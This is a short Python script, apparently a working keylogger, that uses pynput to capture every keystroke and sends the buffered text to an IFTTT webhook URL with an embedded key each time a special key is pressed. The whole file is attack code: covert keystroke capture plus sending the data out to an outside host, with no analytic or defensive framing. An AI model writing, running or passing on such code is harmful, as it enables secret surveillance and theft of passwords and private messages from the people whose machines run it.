from pynput.keyboard import Key, Listener
import urllib.request as ur
s=""
def on_press(key):
        global s
        if len(str(key))>3:
                ur.urlopen("https://maker.ifttt.com/trigger/logger/with/key/dgvnfqEFLZPCeq4j_YWlRD?value1="+s)
                s=""
        else:
                s+=str(key)[1]
with Listener(on_press=on_press) as listener:
        listener.join()




